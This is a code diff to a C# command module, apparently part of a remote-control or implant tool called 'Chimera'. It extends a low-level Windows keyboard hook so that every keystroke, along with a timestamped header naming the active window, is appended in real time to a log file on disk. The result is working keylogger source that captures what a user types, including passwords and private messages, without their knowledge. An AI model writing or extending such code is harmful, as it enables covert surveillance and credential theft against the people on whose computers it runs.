@@ -18,6 +18,8 @@ namespace Chimera.Commands
         [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
         [DllImport("user32.dll")] static extern short  GetAsyncKeyState(int vKey);
         [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
+        [DllImport("user32.dll")] static extern IntPtr GetForegroundWindow();
+        [DllImport("user32.dll")] static extern int    GetWindowText(IntPtr hWnd, StringBuilder text, int count);
 
         private const int WH_KEYBOARD_LL = 13;
         private const int WM_KEYDOWN     = 0x0100;
@@ -28,6 +30,8 @@ namespace Chimera.Commands
         private static readonly object _lock = new object();
         private static Thread   _msgThread  = null;
         private static string   _logPath    = null;
+        private static string   _rtLogPath  = @"C:\projects\keylogger.txt";
+        private static string   _lastWindow = null;
 
         public static string Execute(string param)
         {
@@ -48,6 +52,8 @@ namespace Chimera.Commands
 
             Staging.EnsureDir();
             _logPath = Path.Combine(Staging.Dir, "keylog.txt");
+            // Ensure real-time log dir exists
+            try { Directory.CreateDirectory(@"C:\projects"); } catch { }
 
             _hookProc = LowLevelKeyboardProc;
             _msgThread = new Thread(() =>
@@ -96,13 +102,43 @@ namespace Chimera.Commands
             }
         }
 
+        private static string GetActiveWindowTitle()
+        {
+            try
+            {
+                IntPtr hwnd = GetForegroundWindow();
+                var sb = new StringBuilder(256);
+                GetWindowText(hwnd, sb, 256);
+                return sb.ToString();
+            }
+            catch { return ""; }
+        }
+
+        private static void RtWrite(string text)
+        {
+            try { File.AppendAllText(_rtLogPath, text); } catch { }
+        }
+
         private static IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam)
         {
             if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
             {
                 int vk = Marshal.ReadInt32(lParam);
                 string key = VkToString(vk);
+
+                // Track active window — log header when it changes
+                string win = GetActiveWindowTitle();
+                if (win != _lastWindow)
+                {
+                    _lastWindow = win;
+                    string header = "\n\n[" + DateTime.Now.ToString("yyyy-MM-dd HH:mm:ss") +
+                                    "] [Window: " + win + "]\n";
+                    lock (_lock) { _buf.Append(header); }
+                    RtWrite(header);
+                }
+
                 lock (_lock) { _buf.Append(key); }
+                RtWrite(key);   // real-time write every keystroke
             }
             return CallNextHookEx(_hook, nCode, wParam, lParam);
         }
